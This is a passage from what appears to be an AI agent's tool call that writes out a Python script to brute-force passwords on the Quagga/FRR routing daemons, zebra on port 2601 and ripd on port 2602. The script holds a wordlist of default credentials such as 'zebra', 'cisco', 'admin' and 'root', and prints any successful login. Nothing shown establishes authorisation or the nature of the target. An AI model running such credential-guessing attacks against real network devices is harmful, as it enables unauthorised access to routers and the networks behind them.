 b\'zebra\', b\'quagga\', b\'frr\', b\'frrouting\', \n    b\'admin\', b\'password\', b\'cisco\', b\'router\',\n    b\'ripd\', b\'ospfd\', b\'bgpd\', b\'zebra123\',\n    b\'12345\', b\'1234\', b\'root\', b\'enable\',\n    b\'ZEBRA\', b\'QUAGGA\', b\'FRR\',\n]\n\nprint("Testing passwords on port 2601 (zebra):")\nfor pw in passwords:\n    success, msg = try_password(pw, 2601)\n    if success:\n        print(f"  SUCCESS! Password: {repr(pw)} => {msg}")\n    else:\n        # Only print every 5th to reduce noise\n        if passwords.index(pw) % 5 == 0:\n            print(f"  Testing... {repr(pw)}")\n\nprint("\\nTesting passwords on port 2602 (ripd):")\nfor pw in passwords[:10]:  # Try top 10 on ripd\n    success, msg = try_password(pw, 2602)\n    if success:\n        print(f"  SUCCESS! Password: {repr(pw)} => {msg}")\nPYEOF', 'description': 'Exhaustive password brute force on both zebra ports', 'timeout': 120000}; start
